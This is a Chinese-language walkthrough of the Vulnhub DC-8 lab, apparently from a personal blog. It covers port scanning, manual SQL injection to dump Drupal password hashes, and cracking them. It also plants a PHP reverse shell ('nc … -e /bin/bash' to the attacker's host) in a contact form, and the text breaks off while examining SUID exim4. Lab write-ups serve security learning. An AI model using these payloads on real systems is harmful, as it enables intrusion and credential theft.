{"pageProps":{"postData":{"id":"VulnhubDC-8","contentHtml":"<h1>DC-8</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-8,367/\">https://www.vulnhub.com/entry/dc-8,367/</a></p>\n</blockquote>\n<p>描述：在 Linux 上安装和配置双因素身份验证是否可以防止 Linux 服务器被利用</p>\n<h2>端口扫描主机发现</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>179</code>是靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>                 \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-03 20:46 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00031</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00024</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.179</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00027</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-title function_ invoke__\">FB</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00033</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FE:CA:<span class=\"hljs-number\">7</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>探测主机所有开放端口</p>\n<pre><code class=\"hljs language-php\">map -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.179</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-03 20:47 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.179</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00096</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-title function_ invoke__\">FB</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>探测服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.179</span>    \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-03 20:47 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.179</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00048</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">7.4</span>p1 Debian <span class=\"hljs-number\">10</span>+<span class=\"hljs-title function_ invoke__\">deb9u1</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-title function_ invoke__\">FB</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-03 <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">48</span> CST\nStats: <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> elapsed; <span class=\"hljs-number\">0</span> hosts completed (<span class=\"hljs-number\">0</span> up), <span class=\"hljs-number\">0</span> undergoing Script Pre-Scan\nNSE Timing: About <span class=\"hljs-number\">0.00</span>% done\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00055</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n| http-csrf: \n| Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span>\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span>:<span class=\"hljs-number\">80</span>/node/<span class=\"hljs-number\">3</span>\n|     Form <span class=\"hljs-built_in\">id</span>: webform-client-form-<span class=\"hljs-number\">3</span>\n|_    Form action: /node/<span class=\"hljs-number\">3</span>\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> DOM based XSS.\n| http-enum: \n|   /rss.xml: RSS <span class=\"hljs-keyword\">or</span> Atom feed\n|   /robots.txt: Robots file\n|   /UPGRADE.txt: Drupal file\n|   /INSTALL.txt: Drupal file\n|   /INSTALL.mysql.txt: Drupal file\n|   /INSTALL.pgsql.txt: Drupal file\n|   /CHANGELOG.txt: Drupal v1\n|   /: Drupal version <span class=\"hljs-number\">7</span> \n|   /README.txt: Interesting, a readme.\n|   /<span class=\"hljs-number\">0</span>/: Potentially interesting folder\n|_  /user/: Potentially interesting folder\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">00</span>:FB (VMware)\n</code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>访问主页这次依旧是<code>Drupal</code> ，织纹识别显示版本是<code>Drupal 7</code></p>\n<p><img src=\"/post-images/VulnhubDC-8/image42.png\" alt=\"image.png\"></p>\n<p>文中内容是</p>\n<pre><code class=\"hljs language-python\">\nVery Important Message\n\nThere will be disruptions to this site over the <span class=\"hljs-built_in\">next</span> few weeks <span class=\"hljs-keyword\">while</span> we resolve a few outstanding issues.\n\nWe apologise <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">any</span> inconvenience.\n</code></pre>\n<p><code>Contact Us</code>存在表单，填完后输出：<code>Thanks for taking the time to contact us. We shall be in contact soon.</code> 好像也没啥用</p>\n</li>\n<li>\n<p>扫描目录看看，没什么实质性的东西</p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span> -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span>\n//\n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">49</span>] Starting:                                                                                                                                                                                             \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">35</span>] <span class=\"hljs-number\">200</span> -   33KB - /CHANGELOG.txt                                    \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">37</span>] <span class=\"hljs-number\">200</span> -  769B  - /COPYRIGHT.txt                                    \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">301</span> -  239B  - /includes  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span>/includes/    \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">54</span>] <span class=\"hljs-number\">200</span> -  868B  - /INSTALL.mysql.txt                                \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">54</span>] <span class=\"hljs-number\">200</span> -    1KB - /install.php                                      \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">54</span>] <span class=\"hljs-number\">200</span> -  842B  - /INSTALL.pgsql.txt                                \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">54</span>] <span class=\"hljs-number\">200</span> -    1KB - /install.php?profile=default                      \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">55</span>] <span class=\"hljs-number\">200</span> -    6KB - /INSTALL.txt                                      \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">59</span>] <span class=\"hljs-number\">200</span> -    7KB - /LICENSE.txt                                      \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:02] <span class=\"hljs-number\">200</span> -    2KB - /MAINTAINERS.txt                                  \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:05] <span class=\"hljs-number\">301</span> -  235B  - /misc  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span>/misc/            \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:05] <span class=\"hljs-number\">301</span> -  238B  - /modules  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span>/modules/      \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:08] <span class=\"hljs-number\">200</span> -    2KB - /node                                             \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">301</span> -  239B  - /profiles  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span>/profiles/    \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">20</span>] <span class=\"hljs-number\">200</span> -    2KB - /README.txt                                       \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">21</span>] <span class=\"hljs-number\">200</span> -  744B  - /robots.txt                                       \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">22</span>] <span class=\"hljs-number\">301</span> -  238B  - /scripts  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span>/scripts/      \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">301</span> -  236B  - /sites  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span>/sites/          \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">200</span> -  129B  - /sites/<span class=\"hljs-built_in\">all</span>/libraries/README.txt                   \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">200</span> -    0B  - /sites/example.sites.php                          \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">200</span> -  545B  - /sites/<span class=\"hljs-built_in\">all</span>/themes/README.txt                      \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">27</span>] <span class=\"hljs-number\">200</span> -  715B  - /sites/<span class=\"hljs-built_in\">all</span>/modules/README.txt                     \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">27</span>] <span class=\"hljs-number\">200</span> -  431B  - /sites/README.txt                                 \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">34</span>] <span class=\"hljs-number\">301</span> -  237B  - /themes  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.179</span>/themes/        \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">37</span>] <span class=\"hljs-number\">200</span> -    3KB - /UPGRADE.txt                                      \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">37</span>] <span class=\"hljs-number\">200</span> -    2KB - /user                                             \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">37</span>] <span class=\"hljs-number\">200</span> -    2KB - /user/                                            \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -    2KB - /user/login/                                      \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">40</span>] <span class=\"hljs-number\">200</span> -  177B  - /views/ajax/autocomplete/user/a                   \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">42</span>] <span class=\"hljs-number\">200</span> -    2KB - /web.config                                       \n[<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">46</span>] <span class=\"hljs-number\">200</span> -   42B  - /xmlrpc.php                                              \n</code></pre>\n</li>\n<li>\n<p>当我们点击左边<code>Details</code>栏位的链接的URL是<code>/?nid=1</code> 可能存在<code>SQL</code>注入</p>\n<ul>\n<li>\n<p>输入<code>1'</code> ,惊喜的发现报错了</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># http://192.168.75.179/?nid=1'</span>\n</code></pre>\n<p><img src=\"/post-images/VulnhubDC-8/image43.png\" alt=\"image.png\"></p>\n<p>爆出了<code>SQL</code>语句 ： <code>SELECT title FROM node WHERE nid = 1</code></p>\n</li>\n<li>\n<p>继续深入注入（尝试手工注入）</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># 显示位</span>\n/?nid=<span class=\"hljs-number\">0</span> union select <span class=\"hljs-number\">1</span>\n<span class=\"hljs-comment\"># 用户，dbuser@localhost</span>\n/?nid=<span class=\"hljs-number\">0</span> union select user()\n<span class=\"hljs-comment\"># 当前数据库，d7db</span>\n/?nid=<span class=\"hljs-number\">0</span> union select database()\n<span class=\"hljs-comment\"># 版本，10.1.26-MariaDB-0+deb9u1</span>\n/?nid=<span class=\"hljs-number\">0</span> union select version()\n</code></pre>\n</li>\n<li>\n<p>表中的数据库</p>\n<pre><code class=\"hljs language-python\">/?nid=<span class=\"hljs-number\">0</span> union select group_concat(table_name) <span class=\"hljs-keyword\">from</span> information_schema.tables where table_schema = database()\n</code></pre>\n<pre><code class=\"hljs language-python\">actions,authmap,batch,block,block_custom,block_node_type,block_role,blocked_ips,\ncache,cache_block,cache_bootstrap,cache_field,cache_filter,cache_form,cache_image,\ncache_menu,cache_page,cache_path,cache_views,cache_views_data,ckeditor_input_format,\nckeditor_settings,ctools_css_cache,ctools_object_cache,date_format_locale,\ndate_format_type,date_formats,field_config,field_config_instance,field_data_body,\nfield_data_field_image,field_data_field_tags,field_revision_body,field_revision_field_image,\nfield_revision_field_tags,file_managed,file_usage,<span class=\"hljs-built_in\">filter</span>,filter_format,flood,history,\nimage_effects,image_styles,menu_custom,menu_links,menu_router,node,node_access,\nnode_revision,node_type,queue,rdf_mapping,registry,registry_file,role,role_permission,\nsearch_dataset,search_index,search_node_links,search_total,semaphore,sequences,\nsessions,shortcut_set,shortcut_set_users,site_messages_table,system,taxonomy_index,\ntaxonomy_term_data,taxonomy_term_hierarchy,taxonomy_vocabulary,url_alias,users,\nusers_roles,variable,views_display,views\n</code></pre>\n<p>我们感兴趣的只有<code>users</code></p>\n</li>\n<li>\n<p><code>users</code>表的列</p>\n<pre><code class=\"hljs language-python\">/?nid=<span class=\"hljs-number\">0</span> union select group_concat(column_name) <span class=\"hljs-keyword\">from</span> information_schema.columns where table_schema = database() <span class=\"hljs-keyword\">and</span> table_name = <span class=\"hljs-string\">'users'</span>\n</code></pre>\n<p>仅需要<code>name</code>，<code>pass</code></p>\n<pre><code class=\"hljs language-python\">uid,name,<span class=\"hljs-keyword\">pass</span>,mail,theme,signature,signature_format,created,access,login,status,timezone,language,picture,init,data\n</code></pre>\n</li>\n<li>\n<p><code>users</code>表的数据</p>\n<pre><code class=\"hljs language-python\">/?nid=<span class=\"hljs-number\">0</span> union select group_concat(<span class=\"hljs-string\">'~'</span>,name,<span class=\"hljs-string\">':'</span>,<span class=\"hljs-keyword\">pass</span>,<span class=\"hljs-string\">'~'</span>) <span class=\"hljs-keyword\">from</span> users\n</code></pre>\n<pre><code class=\"hljs language-python\">~:~,\n~admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z~,\n~john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/<span class=\"hljs-number\">3</span><span class=\"hljs-keyword\">if</span>/oRVZJaz5mKC2vF~\n</code></pre>\n<p><code>users</code>表的所有数据</p>\n<pre><code class=\"hljs language-python\">+-----+---------------------+-----------------------+---------------------------------------------------------+------------+---------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+---------+----------+--------------------+-----------+------------+------------------+\n| uid | init                | mail                  | <span class=\"hljs-keyword\">pass</span>                                                    | login      | theme   | data                                                                                                                                                                        | name    | access     | created    | picture | status   | timezone           | signature | language   | signature_format |\n+-----+---------------------+-----------------------+---------------------------------------------------------+------------+---------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+---------+----------+--------------------+-----------+------------+------------------+\n| <span class=\"hljs-number\">0</span>   | &#x3C;blank>             | &#x3C;blank>               | &#x3C;blank>                                                 | <span class=\"hljs-number\">0</span>          | &#x3C;blank> | NULL                                                                                                                                                                        | &#x3C;blank> | <span class=\"hljs-number\">0</span>          | <span class=\"hljs-number\">0</span>          | <span class=\"hljs-number\">0</span>       | <span class=\"hljs-number\">0</span>        | NULL               | &#x3C;blank>   | &#x3C;blank>    | NULL             |\n| <span class=\"hljs-number\">1</span>   | dc8blah@dc8blah.org | dcau-user@outlook.com | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z | <span class=\"hljs-number\">1567766626</span> | &#x3C;blank> | a:<span class=\"hljs-number\">2</span>:{s:<span class=\"hljs-number\">7</span>:<span class=\"hljs-string\">\"contact\"</span>;i:<span class=\"hljs-number\">0</span>;s:<span class=\"hljs-number\">7</span>:<span class=\"hljs-string\">\"overlay\"</span>;i:<span class=\"hljs-number\">1</span>;}                                                                                                                                  | admin   | <span class=\"hljs-number\">1567766818</span> | <span class=\"hljs-number\">1567489015</span> | <span class=\"hljs-number\">0</span>       | <span class=\"hljs-number\">1</span>        | Australia/Brisbane | &#x3C;blank>   | &#x3C;blank>    | filtered_html    |\n| <span class=\"hljs-number\">2</span>   | john@blahsdfsfd.org | john@blahsdfsfd.org   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/<span class=\"hljs-number\">3</span><span class=\"hljs-keyword\">if</span>/oRVZJaz5mKC2vF | <span class=\"hljs-number\">1567497783</span> | &#x3C;blank> | a:<span class=\"hljs-number\">5</span>:{s:<span class=\"hljs-number\">16</span>:<span class=\"hljs-string\">\"ckeditor_default\"</span>;s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"t\"</span>;s:<span class=\"hljs-number\">20</span>:<span class=\"hljs-string\">\"ckeditor_show_toggle\"</span>;s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"t\"</span>;s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"ckeditor_width\"</span>;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"100%\"</span>;s:<span class=\"hljs-number\">13</span>:<span class=\"hljs-string\">\"ckeditor_lang\"</span>;s:<span class=\"hljs-number\">2</span>:<span class=\"hljs-string\">\"en\"</span>;s:<span class=\"hljs-number\">18</span>:<span class=\"hljs-string\">\"ckeditor_auto_lang\"</span>;s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"t\"</span>;} | john    | <span class=\"hljs-number\">1567498512</span> | <span class=\"hljs-number\">1567489250</span> | <span class=\"hljs-number\">0</span>       | <span class=\"hljs-number\">1</span>        | Australia/Brisbane | &#x3C;blank>   | &#x3C;blank>    | filtered_html    |\n+-----+---------------------+-----------------------+---------------------------------------------------------+------------+---------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+---------+----------+--------------------+-----------+------------+------------------+\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>随即将密码放到<code>john</code>爆破，密码存在<code>pass</code>文件里</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># john pass </span>\nUsing default <span class=\"hljs-built_in\">input</span> encoding: UTF-<span class=\"hljs-number\">8</span>\nLoaded <span class=\"hljs-number\">2</span> password hashes <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">2</span> different salts (Drupal7, $S$ [SHA512 <span class=\"hljs-number\">256</span>/<span class=\"hljs-number\">256</span> AVX2 4x])\nCost <span class=\"hljs-number\">1</span> (iteration count) <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">32768</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">all</span> loaded hashes\nWill run <span class=\"hljs-number\">8</span> OpenMP threads\nProceeding <span class=\"hljs-keyword\">with</span> single, rules:Single\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl-C to abort, almost <span class=\"hljs-built_in\">any</span> other key <span class=\"hljs-keyword\">for</span> status\nAlmost done: Processing the remaining buffered candidate passwords, <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">any</span>.\nProceeding <span class=\"hljs-keyword\">with</span> wordlist:/usr/share/john/password.lst\nturtle           (?)     \n</code></pre>\n<p>一段时间后爆破出<code>turtle</code> ,去尝试登陆后台</p>\n</li>\n<li>\n<p>最后用户<code>john</code>使用密码<code>turtle</code> 进入了后台</p>\n</li>\n</ol>\n<h2>利用后台</h2>\n<ol>\n<li>\n<p>进入后台我们直接添加内容输入一句话木马尝试，发现代码没有解析，继续寻找可利用点</p>\n<p><img src=\"/post-images/VulnhubDC-8/image44.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>在<code>My account</code> 里面可以上传头像，想着有没有存在包含漏洞，很可惜图片保存后是绝对路径</p>\n</li>\n<li>\n<p>在<code>Content</code>里面选择<code>Contact Us</code> 然后<code>edit</code> ,如图存在疑似可以插入<code>PHP</code>代码的地方</p>\n<p><img src=\"/post-images/VulnhubDC-8/image45.png\" alt=\"image.png\"></p>\n<p>可以看到内容是我们填完<code>Contact Us</code> 的表单后出现的字符，我们尝试它修改为反弹shell代码</p>\n<pre><code class=\"hljs language-python\">&#x3C;?php system(<span class=\"hljs-string\">'nc 192.168.75.151 1234 -e /bin/bash'</span>); ?>\n</code></pre>\n<p>注意<code>Text Fotmat</code> 修改为<code>PHP code</code> ，同时<code>kali</code>开启监听</p>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1234</span>                          \nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n</code></pre>\n<p>填写表单（随便输点东西），提交，网页一直加载（有说法），返回<code>kali</code>看，反弹<code>shell</code>成功</p>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">$ whoami\nwww-data\n$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n$ uname -a\nLinux dc-<span class=\"hljs-number\">8</span> <span class=\"hljs-number\">4.9</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">4</span>-amd64 <span class=\"hljs-comment\">#1 SMP Debian 4.9.51-1 (2017-09-28) x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>寻找提权的点</p>\n<ul>\n<li>\n<p>SUID</p>\n<pre><code class=\"hljs language-python\">$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f <span class=\"hljs-number\">2</span>>/dev/null\n//\n/usr/<span class=\"hljs-built_in\">bin</span>/chfn\n/usr/<span class=\"hljs-built_in\">bin</span>/gpasswd\n/usr/<span class=\"hljs-built_in\">bin</span>/chsh\n/usr/<span class=\"hljs-built_in\">bin</span>/passwd\n/usr/<span class=\"hljs-built_in\">bin</span>/sudo\n/usr/<span class=\"hljs-built_in\">bin</span>/newgrp\n/usr/sbin/exim4\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-<span class=\"hljs-number\">1.0</span>/dbus-daemon-launch-helper\n/<span class=\"hljs-built_in\">bin</span>/ping\n/<span class=\"hljs-built_in\">bin</span>/su\n/<span class=\"hljs-built_in\">bin</span>/umount\n/<span class=\"hljs-built_in\">bin</span>/mount\n</code></pre>\n<p>看到<code>exim4</code> ，尝试提权</p>\n</li>\n</ul>\n</li>\n<li>\n<p>尝试<code>exim4</code>提权</p>\n<ul>\n<li>\n<p>查看版本，<code>4.89</code></p>\n<pre><code class=\"hljs language-python\">$ exim4 --version\n//\nExim version <span class=\"hljs-number\">4.89</span> <span class=\"hljs-comment\">#2 built 14-Jun-2017 05:03:07</span>\nCopyright (c) University of Cambridge, <span class=\"hljs-number\">1995</span> - <span class=\"hljs-number\">2017</span>\n(c) The Exim Maintainers <span class=\"hljs-keyword\">and</span> contributors <span class=\"hljs-keyword\">in</span> ACKNOWLEDGMENTS file, <span class=\"hljs-number\">2007</span> - <span class=\"hljs-number\">2017</span>\nBerkeley DB: Berkeley DB <span class=\"hljs-number\">5.3</span><span class=\"hljs-number\">.28</span>: (September  <span class=\"hljs-number\">9</span>, <span class=\"hljs-number\">2013</span>)\nSupport <span class=\"hljs-keyword\">for</span>: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open\nLookups (built-<span class=\"hljs-keyword\">in</span>): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd\nAuthenticators: cram_md5 plaintext\nRouters: accept dnslookup ipliteral manualroute queryprogram redirect\nTransports: appendfile/maildir/mailstore autoreply lmtp pipe smtp\nFixed never_users: <span class=\"hljs-number\">0</span>\nConfigure owner: <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>\nSize of off_t: <span class=\"hljs-number\">8</span>\nConfiguration file <span class=\"hljs-keyword\">is</span> 